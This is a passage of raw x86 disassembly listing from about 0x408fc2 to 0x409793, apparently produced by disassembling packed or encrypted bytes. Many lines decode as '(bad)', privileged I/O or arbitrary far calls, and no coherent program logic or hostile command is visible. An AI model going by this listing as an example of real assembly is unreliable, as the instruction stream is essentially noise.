  408fc2:	mov    ch,BYTE PTR [ebx+0x527d2fcb]
  408fc8:	inc    ebp
  408fc9:	ret    
  408fca:	inc    ecx
  408fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fcc:	jne    0x408faf
  408fce:	cdq    
  408fcf:	sbb    dh,ah
  408fd1:	fimul  WORD PTR [eax+0x5899dcbb]
  408fd7:	jg     0x408f76
  408fd9:	ret    
  408fda:	add    dl,BYTE PTR [ebx+0x6abf7423]
  408fe0:	(bad)  
  408fe1:	push   0x42
  408fe3:	jb     0x408f8b
  408fe5:	mov    al,ds:0x714b9f03
  408fea:	dec    ebx
  408feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fec:	adc    edx,DWORD PTR [ebx+0x53e411eb]
  408ff2:	pop    eax
  408ff3:	cmp    DWORD PTR [ecx-0x72271803],esp
  408ff9:	pop    eax
  408ffa:	es lahf 
  408ffc:	mov    edi,0x8153226e
  409001:	pop    ebx
  409002:	ss inc ebx
  409004:	test   DWORD PTR [esi+0x2d3ad390],ebx
  40900a:	pop    edx
  40900b:	inc    edx
  40900c:	fwait
  40900d:	mov    esi,0xde565cd8
  409012:	fsubp  st(3),st
  409014:	push   0x6c
  409016:	lock cmp DWORD PTR [esi+0x7d],edx
  40901a:	add    BYTE PTR [eax+0x12b9014d],dh
  409020:	adc    DWORD PTR [edi+0x12],ecx
  409023:	cmp    ecx,edi
  409025:	sbb    eax,0xfabf5814
  40902a:	push   cs
  40902b:	cmp    ah,dh
  40902d:	sbb    eax,0xcf06549c
  409032:	nop
  409033:	or     DWORD PTR [bp+si+0x2865],edx
  409038:	mov    eax,0xd3bfa826
  40903d:	pop    edx
  40903e:	xor    DWORD PTR [ebx+edi*8-0x24],eax
  409042:	loop   0x409072
  409044:	aad    0xc5
  409046:	sbb    eax,0x2d52a14b
  40904b:	fstp   QWORD PTR [ecx]
  40904d:	cmp    cl,BYTE PTR ds:0x4ca9031f
  409053:	loop   0x409035
  409055:	sbb    bh,ch
  409057:	sbb    al,0xe0
  409059:	cs inc ebp
  40905b:	aas    
  40905c:	fisttp WORD PTR [edx-0x65]
  40905f:	jmp    0x4090bd
  409061:	addr16 mov ah,0x4f
  409064:	rcl    BYTE PTR [ebp+esi*8-0x3673898c],cl
  40906b:	lods   al,BYTE PTR ds:[esi]
  40906c:	cwde   
  40906d:	fiadd  WORD PTR [ecx+0x6c]
  409070:	xor    dl,BYTE PTR ds:0xcef1567b
  409076:	loop   0x409010
  409078:	pop    ebp
  409079:	and    bl,BYTE PTR [eax-0x577965de]
  40907f:	stos   BYTE PTR es:[edi],al
  409080:	mov    bl,0xbc
  409082:	popf   
  409083:	or     dl,BYTE PTR ds:0x6cd00bf7
  409089:	sub    eax,0xe8b87014
  40908e:	jns    0x409078
  409090:	out    0xb0,al
  409092:	arpl   WORD PTR [esi+ecx*2],sp
  409095:	mov    ds:0xb514b6f7,al
  40909a:	mov    al,ds:0x11447cec
  40909f:	fcomp  QWORD PTR [ecx]
  4090a1:	push   cs
  4090a2:	dec    eax
  4090a3:	sub    bl,bh
  4090a5:	(bad)  
  4090a6:	jbe    0x4090b4
  4090a8:	shr    eax,0xf8
  4090ab:	push   cs
  4090ac:	mov    eax,ds:0x7bc83a72
  4090b1:	call   0xf035:0xfd024c69
  4090b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090b9:	(bad)  
  4090ba:	retf   
  4090bb:	sahf   
  4090bc:	add    eax,DWORD PTR [eax]
  4090be:	adc    DWORD PTR [ebp+0x3e],0x7e48f393
  4090c5:	push   cs
  4090c6:	xchg   ebx,eax
  4090c7:	jae    0x4090e3
  4090c9:	fstp   DWORD PTR [edx]
  4090cb:	addr16 aad 0xe6
  4090ce:	data16 cmp BYTE PTR [esi+eiz*8],ch
  4090d2:	push   ebp
  4090d3:	lds    esp,FWORD PTR [edi+ebp*1]
  4090d6:	aam    0x57
  4090d8:	inc    eax
  4090d9:	pop    edx
  4090da:	test   al,0x46
  4090dc:	push   0x9fc233ba
  4090e1:	scas   al,BYTE PTR es:[edi]
  4090e2:	push   DWORD PTR [edx]
  4090e4:	and    ch,ch
  4090e6:	outs   dx,BYTE PTR ds:[esi]
  4090e7:	(bad)  
  4090e9:	pushf  
  4090ea:	sub    eax,esi
  4090ec:	mov    ebp,0x503f9f16
  4090f1:	push   es
  4090f2:	pop    eax
  4090f3:	in     al,0x34
  4090f5:	mov    al,ds:0x61fd5b86
  4090fa:	pusha  
  4090fb:	ret    
  4090fc:	sar    DWORD PTR [ecx],1
  4090fe:	jge    0x40912f
  409100:	jnp    0x40913b
  409102:	je     0x4090bd
  409104:	xor    ecx,ebp
  409106:	clc    
  409107:	in     eax,dx
  409108:	mov    ebx,0x4d971cfd
  40910d:	mov    ds,WORD PTR [edx-0x262935ca]
  409113:	scas   al,BYTE PTR es:[edi]
  409114:	push   esp
  409115:	lods   eax,DWORD PTR ds:[esi]
  409116:	loope  0x4090c6
  409118:	jns    0x409192
  40911a:	push   edx
  40911b:	mov    bl,0x74
  40911d:	imul   edi,ecx,0x23
  409120:	adc    dl,BYTE PTR [eax]
  409122:	pop    eax
  409123:	mov    edx,0xfae54fa4
  409128:	adc    BYTE PTR [esi+0x67c7ff06],0x3e
  40912f:	fs loope 0x409199
  409132:	sub    al,0x5d
  409134:	enter  0x606d,0x63
  409138:	and    dh,al
  40913a:	adc    BYTE PTR [eax-0x3da249cb],0x31
  409141:	mov    bl,0x2a
  409143:	mov    edi,0x5a22d7bd
  409148:	jae    0x409127
  40914a:	lds    eax,FWORD PTR [ebx-0xfce80ef]
  409150:	sbb    BYTE PTR [edx-0x6f],dh
  409153:	enter  0xb2b4,0x37
  409157:	and    BYTE PTR [ecx],bh
  409159:	xor    eax,0x37cb5ac7
  40915e:	jns    0x4090e1
  409160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409161:	jae    0x4091d0
  409163:	push   ss
  409164:	or     bl,BYTE PTR [ebx+0xbd5c68e]
  40916a:	sti    
  40916b:	or     eax,0xbe6af64c
  409170:	pop    ecx
  409171:	mov    DWORD PTR [ebx],ebx
  409173:	dec    edi
  409174:	pop    edx
  409175:	mov    ah,0xec
  409177:	call   0x5516:0x7a00fefb
  40917e:	or     al,0xe0
  409180:	xchg   esp,eax
  409181:	dec    DWORD PTR [edx-0x124fc73b]
  409187:	xlat   BYTE PTR ds:[ebx]
  409188:	dec    ecx
  409189:	js     0x409132
  40918b:	sub    eax,0xdded037e
  409190:	ror    BYTE PTR [esi+eiz*2-0x35089dc8],0xf2
  409198:	xor    DWORD PTR [eax-0x2e],edi
  40919b:	adc    al,0x15
  40919d:	outs   dx,DWORD PTR ds:[esi]
  40919e:	or     al,0x5d
  4091a0:	jecxz  0x409157
  4091a2:	aaa    
  4091a3:	addr16 mov al,ds:0xa891
  4091a7:	lea    edx,[edx-0x6e]
  4091aa:	mov    eax,0xf0c957e4
  4091af:	not    BYTE PTR [esi+0x5ecd32a2]
  4091b5:	cmp    eax,0xa818bd82
  4091ba:	lahf   
  4091bb:	mov    ds:0x9692f365,al
  4091c0:	call   0x9fc40c01
  4091c5:	fstp   TBYTE PTR [eax-0x4a]
  4091c8:	cmp    BYTE PTR [ebx],al
  4091ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091cb:	jns    0x40919b
  4091cd:	cs dec edx
  4091cf:	stos   DWORD PTR es:[edi],eax
  4091d0:	iret   
  4091d1:	cwde   
  4091d2:	retf   0xcdfd
  4091d5:	aam    0x10
  4091d7:	xchg   ebp,eax
  4091d8:	inc    esi
  4091d9:	pop    edx
  4091da:	jl     0x40920b
  4091dc:	test   BYTE PTR [edi],0xf3
  4091df:	lds    esi,FWORD PTR [esi+0x5f]
  4091e2:	rcl    edi,0xdd
  4091e5:	jns    0x40923f
  4091e7:	clc    
  4091e8:	nop
  4091e9:	add    eax,0x580196f1
  4091ee:	mov    ebp,0x6bb0e9e1
  4091f3:	push   edi
  4091f4:	loop   0x4091f4
  4091f6:	xlat   BYTE PTR ds:[ebx]
  4091f7:	xlat   BYTE PTR ds:[ebx]
  4091f8:	sbb    BYTE PTR [ecx],ch
  4091fa:	(bad)  
  4091fb:	loop   0x4091c7
  4091fd:	push   eax
  4091fe:	adc    DWORD PTR [edi+0x5d7ca665],ecx
  409204:	(bad)  
  409205:	rcl    BYTE PTR ds:0xae5006f5,cl
  40920b:	fiadd  DWORD PTR [edi+esi*1+0x17]
  40920f:	popf   
  409210:	or     DWORD PTR [edx+0x38],edi
  409213:	push   esi
  409214:	retf   0xb8ab
  409217:	mov    DWORD PTR [edx*4+0x6ec1dca9],ecx
  40921e:	add    al,0x39
  409220:	or     al,0xb0
  409222:	mov    dh,0x21
  409224:	push   ebp
  409225:	mov    cl,0x8b
  409227:	xchg   ebx,eax
  409228:	out    dx,al
  409229:	cwde   
  40922a:	jle    0x4091e5
  40922c:	pop    esp
  40922d:	ss mov al,0x48
  409230:	call   0x24e9:0xbd2895cb
  409237:	gs repnz mov ah,0x79
  40923b:	mov    bl,0x3f
  40923d:	pop    ecx
  40923e:	iret   
  40923f:	xchg   esi,eax
  409240:	push   ebp
  409241:	js     0x409292
  409243:	nop
  409244:	inc    edi
  409245:	xchg   ebp,eax
  409246:	test   eax,0xec36b167
  40924b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40924c:	cli    
  40924d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40924e:	out    0x49,al
  409250:	dec    edi
  409251:	aad    0xed
  409253:	pusha  
  409254:	xor    ebp,ecx
  409256:	popf   
  409257:	fstp   DWORD PTR [edi-0xfd1ee9]
  40925d:	or     BYTE PTR [edx-0x2c277b16],bl
  409263:	push   ebx
  409264:	popa   
  409265:	cmp    al,0x48
  409267:	dec    eax
  409268:	jp     0x4092cd
  40926a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40926b:	cmp    BYTE PTR [ecx+ecx*8+0x45c713e4],ch
  409272:	jae    0x4091f6
  409274:	mov    fs,WORD PTR [edi-0x17]
  409277:	call   0xb19480f5
  40927c:	aam    0xa3
  40927e:	pop    eax
  40927f:	in     al,dx
  409280:	popf   
  409281:	fbstp  TBYTE PTR [eax+0x19dd9af1]
  409287:	pop    ebx
  409288:	push   ebp
  409289:	cmp    cl,BYTE PTR gs:[ebp+0x4d80c947]
  409290:	adc    DWORD PTR [eax+0x1d],ecx
  409293:	or     al,0xe9
  409295:	pop    ebx
  409296:	lods   eax,DWORD PTR ds:[esi]
  409297:	xor    esp,DWORD PTR [ebx+0x51]
  40929a:	loope  0x40925c
  40929c:	pop    esi
  40929d:	xchg   esi,eax
  40929e:	mov    ecx,0x3764a592
  4092a3:	in     eax,dx
  4092a4:	jg     0x4092d3
  4092a6:	xor    al,0xf3
  4092a8:	jp     0x409235
  4092aa:	icebp  
  4092ab:	jb     0x4092bb
  4092ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092ae:	sbb    al,0x54
  4092b0:	popf   
  4092b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092b2:	fwait
  4092b3:	sub    al,0x1d
  4092b5:	pop    edi
  4092b6:	arpl   bx,dx
  4092b8:	xchg   ebp,eax
  4092b9:	int    0x50
  4092bb:	push   0x6954547b
  4092c0:	icebp  
  4092c1:	cs in  al,0xef
  4092c4:	push   ecx
  4092c5:	imul   ebx,eax,0x17
  4092c8:	clc    
  4092c9:	jns    0x409331
  4092cb:	pop    ecx
  4092cc:	mov    dl,0xb6
  4092ce:	and    bl,BYTE PTR [ecx+edx*8+0x66]
  4092d2:	sbb    BYTE PTR [ebx-0x4febaa2],bl
  4092d8:	adc    BYTE PTR [esi-0xd],bh
  4092db:	mov    ebp,0x877db0a1
  4092e0:	sbb    eax,0xf3230ffc
  4092e5:	out    0x3a,eax
  4092e7:	shl    bh,1
  4092e9:	mov    WORD PTR [esi+0x6f],?
  4092ec:	lds    ecx,FWORD PTR [esi+0x49]
  4092ef:	jp     0x4092dd
  4092f1:	sar    BYTE PTR [bx+si],1
  4092f4:	shl    DWORD PTR [eax-0xc3f2a2b],1
  4092fa:	lea    ebx,[edx+0xf]
  4092fd:	repnz iret 
  4092ff:	iret   
  409300:	cmp    DWORD PTR [eax+0x70],0xc085262e
  409307:	stos   BYTE PTR es:[edi],al
  409308:	mov    WORD PTR ds:0xaa5c613,ds
  40930e:	cmp    DWORD PTR [eax-0x48b5b6af],0x34
  409315:	add    dl,BYTE PTR [edi+0x96c46db]
  40931b:	(bad)  
  40931c:	mov    bh,0x6f
  40931e:	xor    eax,0xc06ed7a2
  409323:	neg    DWORD PTR [ebp+0x4a]
  409326:	add    BYTE PTR [ebx],bl
  409328:	ins    DWORD PTR es:[edi],dx
  409329:	jnp    0x40930f
  40932b:	and    BYTE PTR [ebx-0x53],0x16
  40932f:	cmc    
  409330:	dec    edx
  409331:	jmp    0x354142f7
  409336:	inc    esp
  409337:	loope  0x40932b
  409339:	mov    eax,0x885e0d10
  40933e:	jno    0x4092fa
  409340:	xlat   BYTE PTR ds:[ebx]
  409341:	js     0x4092ca
  409343:	push   esp
  409344:	cmc    
  409345:	pop    ecx
  409346:	mov    ch,dh
  409348:	fdiv   QWORD PTR [edi+ecx*4]
  40934b:	sub    ecx,DWORD PTR [edi-0x2c40f80c]
  409351:	jp     0x40935d
  409353:	lods   eax,DWORD PTR ds:[esi]
  409354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409355:	push   edi
  409356:	lahf   
  409357:	add    BYTE PTR [ecx],bh
  409359:	call   0x3f53:0xed749f4
  409360:	cld    
  409361:	push   ebx
  409362:	(bad)  
  409363:	aas    
  409364:	in     eax,dx
  409365:	add    al,0x24
  409367:	adc    eax,0xa626456b
  40936c:	mov    ds:0xdc75e5ab,al
  409371:	dec    edi
  409372:	mov    DWORD PTR [ecx-0x62af652a],0x8631a62f
  40937c:	sbb    dh,BYTE PTR [ecx-0x3fabe737]
  409382:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  409384:	lahf   
  409385:	cwde   
  409386:	or     eax,0x3e532f7e
  40938b:	sbb    eax,0x85f7385f
  409390:	jmp    0xb7baca07
  409395:	sbb    edx,DWORD PTR [esi]
  409397:	mov    WORD PTR [ecx-0x35],es
  40939a:	popa   
  40939b:	ja     0x409391
  40939d:	cmp    DWORD PTR ds:0x97dc392d,0xffffffb5
  4093a4:	ins    DWORD PTR es:[edi],dx
  4093a5:	or     dl,BYTE PTR [esi+0x4dc644f]
  4093ab:	xchg   ecx,eax
  4093ac:	and    eax,0x77f4a0f9
  4093b1:	adc    al,BYTE PTR [esi]
  4093b3:	popa   
  4093b4:	dec    edx
  4093b5:	stos   DWORD PTR es:[edi],eax
  4093b6:	add    eax,0x58bab07d
  4093bb:	outs   dx,BYTE PTR ds:[esi]
  4093bc:	fadd   st,st(2)
  4093be:	(bad)  
  4093bf:	mov    ds:0x2767979f,eax
  4093c4:	repz adc DWORD PTR ds:0x3ba43f10,esi
  4093cb:	and    edx,DWORD PTR [ecx]
  4093cd:	jae    0x40941b
  4093cf:	xlat   BYTE PTR ds:[ebx]
  4093d0:	outs   dx,DWORD PTR cs:[esi]
  4093d2:	loope  0x4093c2
  4093d4:	adc    eax,0xdff7efb9
  4093d9:	repnz push ebx
  4093db:	ret    0x9408
  4093de:	add    DWORD PTR [esi+ebp*1+0xd],ecx
  4093e2:	fld    DWORD PTR [ecx+edi*2+0x6d]
  4093e6:	pop    ds
  4093e7:	jo     0x40936c
  4093e9:	xchg   BYTE PTR [esi+0xa],dh
  4093ec:	adc    BYTE PTR [ecx+ebp*8+0x73],dl
  4093f0:	mov    al,0x58
  4093f2:	cmp    DWORD PTR [ebx+0x656c2ebf],0x63
  4093f9:	sahf   
  4093fa:	mov    WORD PTR [ecx-0x6b7a1d6c],fs
  409400:	xchg   ecx,eax
  409401:	or     DWORD PTR [ecx],eax
  409403:	xor    edx,DWORD PTR [eax+0x4611f89d]
  409409:	mov    ah,0xeb
  40940b:	imul   eax,DWORD PTR [ecx-0x34],0x3149555c
  409412:	push   cs
  409413:	dec    ecx
  409414:	push   ebx
  409415:	cmp    bh,dh
  409417:	loopne 0x4093ec
  409419:	inc    ebp
  40941a:	inc    esi
  40941b:	or     eax,0x7a921cbe
  409420:	(bad)  
  409421:	sahf   
  409422:	pop    ebp
  409423:	add    ebp,DWORD PTR [ecx+0x816b7ca]
  409429:	sub    eax,0x2b9c17bb
  40942e:	out    dx,eax
  40942f:	sbb    edi,DWORD PTR [edx+0x1c8437f6]
  409435:	mov    ch,0x61
  409437:	add    BYTE PTR [ebp-0x7368e63c],0x81
  40943e:	mov    ds:0x60c4585d,eax
  409443:	mov    ch,0x22
  409445:	dec    edi
  409446:	mov    ebx,0xeba6c0ce
  40944b:	jle    0x4093e3
  40944d:	mov    dh,0x2e
  40944f:	xchg   ecx,eax
  409450:	aas    
  409451:	adc    BYTE PTR [esi-0x50],dl
  409454:	repnz pop ecx
  409456:	std    
  409457:	push   eax
  409458:	hlt    
  409459:	dec    edi
  40945a:	ss js  0x40940c
  40945d:	inc    eax
  40945e:	imul   BYTE PTR [ecx-0x52]
  409461:	jno    0x4093eb
  409463:	mov    ebx,esp
  409465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409466:	ret    
  409467:	aam    0xdd
  409469:	dec    ebp
  40946a:	pop    edi
  40946b:	stos   DWORD PTR es:[edi],eax
  40946c:	xchg   esp,eax
  40946d:	idiv   BYTE PTR [edi-0x691d781f]
  409473:	dec    ebp
  409474:	jne    0x4093ff
  409476:	(bad)  
  409477:	sbb    dh,BYTE PTR fs:[esi]
  40947a:	adc    eax,0xa772e665
  40947f:	sbb    esi,DWORD PTR [edi+0x56]
  409482:	xor    DWORD PTR [ebx+0x39c84b90],esp
  409488:	cmp    ah,BYTE PTR [ebx+0x32]
  40948b:	jo     0x409421
  40948d:	inc    esi
  40948e:	gs repnz push eax
  409491:	popa   
  409492:	cmc    
  409493:	mov    esi,0x36d786b9
  409498:	(bad)  
  409499:	sti    
  40949a:	gs hlt 
  40949c:	outs   dx,DWORD PTR ds:[esi]
  40949d:	in     al,dx
  40949e:	shl    DWORD PTR [ebp-0x1],cl
  4094a1:	cmp    edx,edi
  4094a3:	push   esp
  4094a5:	inc    ecx
  4094a6:	xchg   DWORD PTR [ecx+edi*4],esp
  4094a9:	mov    dl,0x2c
  4094ab:	xor    bh,BYTE PTR [ecx-0xa]
  4094ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094af:	or     al,0x4b
  4094b1:	das    
  4094b2:	shl    DWORD PTR [edx-0x360b001e],1
  4094b8:	add    al,0x47
  4094ba:	inc    edi
  4094bb:	inc    esi
  4094bc:	das    
  4094bd:	push   esp
  4094be:	retf   
  4094bf:	pusha  
  4094c0:	mov    eax,0xa047ea8
  4094c5:	in     eax,dx
  4094c6:	idiv   BYTE PTR [ebx+0x66926691]
  4094cc:	push   ecx
  4094cd:	sti    
  4094ce:	test   DWORD PTR [eax-0x1248fd2e],ebp
  4094d4:	test   DWORD PTR [edi-0xf],0x914d3e83
  4094db:	(bad)  
  4094dd:	cmp    BYTE PTR [edx-0x4897c5f0],dh
  4094e3:	jno    0x409556
  4094e5:	push   0x6b2da185
  4094ea:	lea    ebp,[esi+0x61]
  4094ed:	loope  0x409506
  4094ef:	cmp    cl,dh
  4094f1:	test   al,0x35
  4094f3:	test   DWORD PTR [esi],ebp
  4094f5:	add    ch,al
  4094f7:	cmp    bh,ah
  4094f9:	xchg   esi,edi
  4094fb:	aaa    
  4094fc:	cmp    ch,0x19
  4094ff:	xlat   BYTE PTR ds:[ebx]
  409500:	stc    
  409501:	shl    BYTE PTR [ebx],0xb3
  409504:	test   DWORD PTR [edx-0x49e6414f],edx
  40950a:	cwde   
  40950b:	mov    ebx,0x2333e53
  409510:	dec    ecx
  409511:	shl    DWORD PTR [ecx],0xef
  409514:	outs   dx,BYTE PTR ds:[esi]
  409515:	bnd jle 0x409524
  409518:	jmp    0x4094e8
  40951a:	push   cs
  40951b:	call   0x3741:0xd4a74723
  409522:	xchg   esp,eax
  409523:	stc    
  409524:	xor    dh,BYTE PTR [esi]
  409526:	xchg   esp,eax
  409527:	ins    DWORD PTR es:[edi],dx
  409528:	and    eax,0xf6bb7109
  40952d:	pop    eax
  40952e:	mov    esp,0x73ee4bc4
  409533:	sti    
  409534:	adc    edx,DWORD PTR [edi-0x528dbd9c]
  40953a:	cmp    dl,BYTE PTR es:[ebx-0x179c3c41]
  409541:	ja     0x40950c
  409543:	ja     0x40951f
  409545:	jns    0x4094fc
  409547:	scas   eax,DWORD PTR es:[edi]
  409548:	ins    BYTE PTR es:[edi],dx
  409549:	cmp    DWORD PTR [edx-0x19],ecx
  40954c:	mov    esi,0xaf3e9ffe
  409551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409553:	nop
  409554:	aam    0x6b
  409556:	mov    eax,0x63f59bd1
  40955b:	mov    ?,WORD PTR [edi-0x1a]
  40955e:	ja     0x4095b8
  409560:	sbb    eax,0xe3bfbb7a
  409565:	cmp    ah,bh
  409567:	aam    0x81
  409569:	gs jmp 0x409598
  40956c:	mov    esi,0x62ededf5
  409571:	stos   DWORD PTR es:[edi],eax
  409572:	mov    cl,0xcd
  409574:	cmp    ch,BYTE PTR [eax-0x1a046eab]
  40957a:	sbb    ch,BYTE PTR [ebx+0x141626e8]
  409580:	out    dx,eax
  409581:	outs   dx,BYTE PTR ds:[esi]
  409582:	aas    
  409583:	(bad)  
  409584:	aas    
  409585:	loope  0x40953d
  409587:	add    bl,cl
  409589:	mov    bh,al
  40958b:	inc    eax
  40958c:	aam    0x9e
  40958e:	mov    eax,0x9d267a32
  409593:	inc    eax
  409594:	jnp    0x4095cd
  409596:	repnz mov DWORD PTR [ebx+0x2451d6bc],ebx
  40959d:	cmc    
  40959e:	std    
  40959f:	icebp  
  4095a0:	dec    ecx
  4095a1:	addr16 push ds
  4095a3:	test   al,0xc2
  4095a5:	push   cs
  4095a6:	loope  0x409549
  4095a8:	jb     0x409603
  4095aa:	daa    
  4095ab:	fucompp 
  4095ad:	jne    0x409567
  4095af:	hlt    
  4095b0:	add    esp,DWORD PTR [ebx-0xbc83eef]
  4095b6:	test   eax,0x1fe1c984
  4095bb:	sub    dl,BYTE PTR [ebx]
  4095bd:	loope  0x4095df
  4095bf:	fistp  WORD PTR [edi-0x7]
  4095c2:	lods   al,BYTE PTR es:[esi]
  4095c4:	ret    0xb4e3
  4095c7:	scas   al,BYTE PTR es:[edi]
  4095c8:	jae    0x4095ef
  4095ca:	xor    al,0x5
  4095cc:	clc    
  4095cd:	sahf   
  4095ce:	ret    
  4095cf:	bound  ecx,QWORD PTR [edx]
  4095d1:	xor    BYTE PTR [esi-0x31],cl
  4095d4:	or     ecx,DWORD PTR [edx+0x0]
  4095d7:	(bad)  
  4095d8:	addr16 jge 0x409619
  4095db:	in     al,dx
  4095dc:	sub    al,0x3b
  4095de:	sbb    bl,ch
  4095e0:	jo     0x4095f2
  4095e2:	add    BYTE PTR [ecx],dl
  4095e4:	mov    ecx,0xcb63d05b
  4095e9:	xchg   edi,eax
  4095ea:	std    
  4095eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095ec:	pop    ss
  4095ed:	es fdivp st(5),st
  4095f0:	ja     0x409661
  4095f2:	sbb    DWORD PTR [eax-0x3d],ecx
  4095f5:	xchg   esi,eax
  4095f6:	pop    edi
  4095f7:	frstor [eax]
  4095f9:	pop    edi
  4095fa:	dec    edi
  4095fb:	(bad)
  4095fe:	add    eax,esp
  409600:	inc    edi
  409601:	popf   
  409602:	mov    cl,0x4
  409604:	mov    cl,0x3e
  409606:	push   ss
  409607:	adc    BYTE PTR [edi],dl
  409609:	or     DWORD PTR [edx+0x6],esp
  40960c:	inc    esp
  40960d:	sub    DWORD PTR [edx-0x21f7c543],ecx
  409613:	les    esp,FWORD PTR [ebx+0x2362a0a7]
  409619:	inc    eax
  40961a:	scas   eax,DWORD PTR es:[edi]
  40961b:	push   ss
  40961c:	inc    ecx
  40961d:	lods   eax,DWORD PTR ss:[esi]
  40961f:	ins    DWORD PTR es:[edi],dx
  409620:	mov    edx,0xb0a8ab62
  409625:	adc    al,dh
  409627:	mov    ds:0xe9fdfbde,eax
  40962c:	add    edi,DWORD PTR ds:0x19c33ff9
  409632:	fsubr  DWORD PTR [ecx+0x72]
  409635:	pop    ecx
  409636:	sub    ecx,esi
  409638:	add    esp,DWORD PTR [ecx+0x2cdbbe77]
  40963e:	sar    ah,1
  409640:	jle    0x409690
  409642:	fwait
  409643:	add    BYTE PTR [eax-0x7b6f7a98],cl
  409649:	outs   dx,DWORD PTR ds:[esi]
  40964a:	mov    esi,0xd8e429ff
  40964f:	fdivr  DWORD PTR [edx-0x15836dce]
  409655:	mov    ah,bh
  409657:	pop    esi
  409658:	aad    0x4d
  40965a:	cwde   
  40965b:	mov    esi,0x3eb2de59
  409660:	call   0x4a99:0xea514d42
  409667:	pop    ds
  409668:	rol    BYTE PTR [eax],0x1d
  40966b:	mov    ebp,0x3a05453f
  409670:	cli    
  409671:	clc    
  409672:	add    BYTE PTR [eax],0xc
  409675:	shl    BYTE PTR [esi+ebx*8],1
  409678:	pop    edi
  409679:	aaa    
  40967a:	aas    
  40967b:	add    al,0x8b
  40967d:	stos   DWORD PTR es:[edi],eax
  40967e:	sbb    ebx,DWORD PTR [edi+0x6]
  409681:	inc    esi
  409682:	xlat   BYTE PTR ds:[ebx]
  409683:	sub    eax,0x3840e2ba
  409688:	aam    0xde
  40968a:	ret    
  40968b:	add    dl,cl
  40968d:	or     DWORD PTR ds:0x7e6e8973,eax
  409693:	ins    DWORD PTR es:[edi],dx
  409694:	repz (bad) 
  409696:	push   0xee822752
  40969b:	fs jg  0x4096b8
  40969e:	mov    cl,0x4e
  4096a0:	cmp    ah,BYTE PTR ds:0xa98582ba
  4096a6:	(bad)  
  4096a7:	or     al,0x77
  4096a9:	xlat   BYTE PTR ds:[ebx]
  4096aa:	adc    BYTE PTR [ebx+ecx*1-0x1d10342b],ch
  4096b1:	ja     0x4096f7
  4096b3:	xchg   ebp,eax
  4096b4:	pusha  
  4096b5:	inc    edx
  4096b6:	add    dh,BYTE PTR [eax]
  4096b8:	shl    DWORD PTR [esi],cl
  4096ba:	mov    al,ds:0x6ab5b744
  4096bf:	add    bh,BYTE PTR [esi]
  4096c1:	and    eax,0x1f8395eb
  4096c6:	mov    esp,0x549c50a5
  4096cb:	and    BYTE PTR [edi],bh
  4096cd:	in     eax,0xc3
  4096cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096d0:	sbb    al,0xc9
  4096d2:	out    0x4f,al
  4096d4:	mov    edi,0x13c4a229
  4096d9:	inc    edx
  4096da:	mov    ebp,0x7c940ff3
  4096df:	dec    ebx
  4096e0:	dec    edi
  4096e1:	clc    
  4096e2:	push   es
  4096e3:	cld    
  4096e4:	fidivr WORD PTR [eax-0x1d]
  4096e7:	inc    ecx
  4096e8:	dec    edx
  4096e9:	out    0xde,al
  4096eb:	xor    DWORD PTR [esp+edi*1-0x1c],edi
  4096ef:	test   al,0xa2
  4096f1:	jbe    0x4096db
  4096f3:	leave  
  4096f4:	hlt    
  4096f5:	mov    ecx,ecx
  4096f7:	imul   edi,DWORD PTR [edi],0x47a1e382
  4096fd:	dec    edx
  4096fe:	sub    BYTE PTR [ebx-0x23],0xb6
  409702:	clc    
  409703:	cmc    
  409704:	test   DWORD PTR [edx-0x1f6c4867],edi
  40970a:	mov    ds:0x786d6de7,eax
  40970f:	in     eax,dx
  409710:	pop    ecx
  409711:	jne    0x40977e
  409713:	imul   edx,DWORD PTR [ebx],0xd66cb44b
  409719:	jp     0x409783
  40971b:	xchg   edx,eax
  40971c:	inc    ebx
  40971d:	jae    0x40973b
  40971f:	push   ds
  409720:	cld    
  409721:	jge    0x40970b
  409723:	outs   dx,DWORD PTR ds:[esi]
  409724:	or     eax,DWORD PTR [eax]
  409726:	mov    al,ds:0x9b476c27
  40972b:	lods   al,BYTE PTR ds:[esi]
  40972c:	retf   0x165c
  40972f:	ss dec edx
  409731:	fnstenv [esi]
  409733:	call   0xaed6:0x761ac3d1
  40973a:	xor    al,BYTE PTR [esi+0x5837eb07]
  409740:	shl    DWORD PTR [ebx+0x76842fa],1
  409746:	int3   
  409747:	mov    bh,0x6f
  409749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40974a:	idiv   BYTE PTR [esi-0x75]
  40974d:	add    DWORD PTR [eax],ebx
  40974f:	push   edi
  409750:	xor    DWORD PTR [esi-0x64],ebp
  409753:	push   ss
  409754:	fst    QWORD PTR [edx+0x687f69c9]
  40975a:	loopne 0x40972e
  40975c:	push   0xc0c6edde
  409761:	mov    ch,0x82
  409763:	out    0x2b,al
  409765:	not    esi
  409767:	pop    edi
  409768:	push   esp
  409769:	mov    BYTE PTR [edi-0x698effb5],cl
  40976f:	cmc    
  409770:	fstp   DWORD PTR [ecx-0x6fad5529]
  409776:	mov    eax,0x2669b9
  40977b:	mov    al,0x4d
  40977d:	sbb    DWORD PTR [esi],ebx
  40977f:	sub    bh,bl
  409781:	adc    dl,bh
  409783:	cld    
  409784:	xor    cl,BYTE PTR [esi-0x70]
  409787:	or     al,0xfa
  409789:	push   0xb8d2d0f8
  40978e:	mov    WORD PTR [eax],fs
  409790:	jl     0x409775
  409792:	scas   eax,DWORD PTR es:[edi]
  409793:	sti    
